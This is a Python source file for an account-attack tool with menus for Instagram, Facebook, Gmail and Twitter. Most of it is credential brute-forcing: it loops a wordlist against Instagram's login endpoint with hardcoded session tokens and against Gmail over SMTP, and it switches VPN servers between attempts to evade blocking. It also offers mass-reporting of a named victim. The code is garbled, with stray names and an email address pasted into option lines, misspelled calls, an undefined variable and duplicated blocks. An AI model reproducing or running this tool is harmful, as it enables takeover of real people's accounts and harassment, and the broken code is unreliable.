from src.smhtk import *
from src.user_agents import user_agents
import os
import random
import requests
import time
from requests import Session
import sys
import mechanize
import smtplib

codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W", "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
choiceCode = random.choice(codeList)
option_list = []

sleep_time = 4
b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True

b.addheaders = [('User-agent',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
                 )]

os.system("clear")
ascii()
select_an_option()
print("["+color.GREEN+"1"+color.END+"] "+color.YELLOW+"Instagram\n"+color.END+"["+color.GREEN+"2"+color.END+"] "+color.BLUE+"Facebook"+"\n"+color.END+"["+color.GREEN+"3"+color.END+"] "+color.RED+"Gmail"+color.END+"\n"+color.END+"["+color.GREEN+"4"+color.END+"] "+color.CYAN+"Twitter"+color.END)
option = input("\n> ")
if option == "1":
    option_name = "instagram"Esho.gold001
elif option == "2":
    option_name = "facebook"Bergin boulton
elif option == "3":
    option_name = "gmail"Eshogbenga001@gmail.com
elif option == "4":
    option_name = "twitter"
option_list.append(option_name)
clear()
ascii()
print(color.GREEN+"/"+option_list[0]+ "\n")
select_an_option()



        
def InstagramBruteforce():
    print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
    option = input("\n> ")
    if option == "1":
      vpn = "False"
    elif option == "2":
        vpn = "True"
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
    select_an_username()
    victim = input("\n> @")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"\n"+color.END)
    select_an_wordlist()
    wl = input("\n> ")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"/wl?"+wl+"\n"+color.END)
    if vpn == "False":
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines() 
            count = 0
        except FileNotFoundError:
            print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
            exit()

        rs = requests.session()
        for line in Lines:
            try:
                password = ""
                pstest = ("{}".format(line.strip()))
                password = pstest
                url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {
                        'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-length': '275',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
                'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': 'bc3d5af829ea',
                'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                        'username': f'{victim}',
                        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                        'queryParams': '{}',
                        'optIntoOneTap': 'false'
                }    
                r = rs.post(url, headers=headers, data=data)
                if  'authenticated":true' in r.text or 'userId' in r.text:
                        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                        print("")
                        print ("["+"+"+"]"+" PASSWORD FINDED:  "+password)
                        exit()
                else:
                        print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                        time.sleep(int(sleep_time))
            except Exception:
                print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                time.sleep(1)
    if vpn == "True":
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines() 
            count = 0
        except FileNotFoundError:
            print(+"ERROR 0x1: "+wl+" file not found, make sure it is in the directory.")
            exit()

        rs = requests.session()
        for line in Lines:
            try:
                password = ""
                pstest = ("{}".format(line.strip()))
                password = pstest
                url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {
                        'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-length': '275',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
                'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': 'bc3d5af829ea',
                'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                        'username': f'{username}',
                        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                        'queryParams': '{}',
                        'optIntoOneTap': 'false'
                }    
                r = rs.post(url, headers=headers, data=data)
                if  'authenticated":true' in r.text or 'userId' in r.text:
                        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                        print("")
                        print ("["+"+"+"]"+" PASSWORD FINDED  "+password)
                        exit()
                else:
                        print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                        time.sleep(int(sleep_time))
                        os.system("\nwindscribe connect " + choiceCode)
                        time.sleep(2)
            except Exception:
                print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                time.sleep(1)
                os.system("\nwindscribe connect " + choiceCode)
                
    if vpn == "False":
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines() 
            count = 0
        except FileNotFoundError:
            print(+"ERROR 0x1: "+wl+" file not found, make sure it is in the directory.")
            exit()

        rs = requests.session()
        for line in Lines:
            try:
                password = ""
                pstest = ("{}".format(line.strip()))
                password = pstest
                url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {
                        'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-length': '275',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
                'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': 'bc3d5af829ea',
                'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                        'username': f'{username}',
                        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                        'queryParams': '{}',
                        'optIntoOneTap': 'false'
                }    
                r = rs.post(url, headers=headers, data=data)
                if  'authenticated":true' in r.text or 'userId' in r.text:
                        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
                        print("")
                        print ("["+"+"+"]"+" PASSWORD FINDED  "+password)
                        exit()
                else:
                        print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                        time.sleep(int(sleep_time))
                        time.sleep(2)
            except Exception:
                print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                time.spleep(1)
if option == "1":
    InstagramChoiche()
    option = input("\n> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
    if option == "1":
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_option()
        InstagramBruteforce()
    if option == "2":
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_username()
        username = input("\n> @")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+username+"\n"+color.END)
        select_an_amount()
        amount = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+username+"amount?"+amount+"\n"+color.END)
        report_profile_attack(username, int(amount))
    option = input("\n> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
    if option == "3":
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_option()
        InstagramBruteforce()
if option == "3":
    clear()
    ascii()
    GmailC()
    option = input("> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+"toselect"+"\n"+color.END)
    select_an_option()
    print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
    index = 10
    option = input("\n> ")
    print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
    if option == "1":
        vpn = "False"
    elif option == "2":
        vpn = "True"
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
    select_an_email()
    username = input("\n> ")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+username+"\n"+color.END)
    select_an_wordlist()
    wl = input("\n> ")
    clear()
    ascii()
    print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+username+"amount?"+"noamount"+"\n"+color.END)
    try:
        with open(wl, 'r') as f:
            Lines = f.readlines() 
        count = 0
    except FileNotFoundError:
        print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
        exit()
    if option == "1":
        for password in Lines:
            try:
                session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
                session.starttls() #enable security
                session.login(username, password) #logi
                print("["+color.GREEN+"-"+color.END+"]"+color.GEEN+"Password: "+color.END+password)
            except Exception:
                print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)
                if vpn == "True":
                    os.system("\nwindscribe connect " + choiceCode)
        
if option == "2":
    FacebookChoiche()
    option = input("\n> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")
    if option == "1":

        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+"toselect"+"\n"+color.END)
        select_an_option()
        print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
        index = 10
        option = input("\n> ")
        print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
        if option == "1":
            vpn = "False"
        elif option == "2":
            vpn = "True"
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_usernamefb()

        victim = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"\n"+color.END)
        select_an_wordlist()
        wl = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"/wl?"+wl+"\n"+color.END)
        if vpn == "False":
            try:
                file1 = open(wl, 'r')
                Lines = file1.readlines() 
                count = 0
            except FileNotFoundError:
                print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
                exit()
            for passw in Lines:
                is_this_a_password(victim, index, passw)
        elif vpn == "True":
            try:
                file1 = open(wl, 'r')
                Lines = file1.readlines() 
                count = 0
            except FileNotFoundError:
                print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
                exit()
            for passw in Lines:
                is_this_a_password(victim, index, passw)
                if vpn == "True":
                    os.system("\nwindscribe connect " + choiceCode)            

if option == "4":
    TwitterCoiche()
    option = input("\n> ")
    if option == "1":
        option_list.append("bruteforce")
    if option == "2":
        option_list.append("massreporter")
    if option == "3":
        option_list.append("phishing")

    if option == "1":
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_option()
        print('''['''+color.GREEN+'''1'''+color.END+'''] vpn[off]
['''+color.GREEN+'''2'''+color.END+'''] vpn[on]
''')
        vpn = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"\n"+color.END)
        select_an_usernamefb()
        victim = input("\n> ")
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"\n"+color.END)
        select_an_wordlist()
        wl = input("\n> ")
        try:
            file1 = open(wl, 'r')
            Lines = file1.readlines()
        except Exception:
                print(color.RED+"ERROR 0x1: "+color.END+wl+" file not find, make sure it is in the directory.")
                exit()
        clear()
        ascii()
        print(color.GREEN+"/"+option_list[0]+ "/attack/"+option_list[1]+"/victim?"+victim+"/wl?"+wl+"\n"+color.END)
        for password in Lines:
            if vpn == "1":
                twitter(password, victim)
            if vpn == "2":
                os.system("\nwindscribe connect " + choiceCode)
                twitter(password, victim)
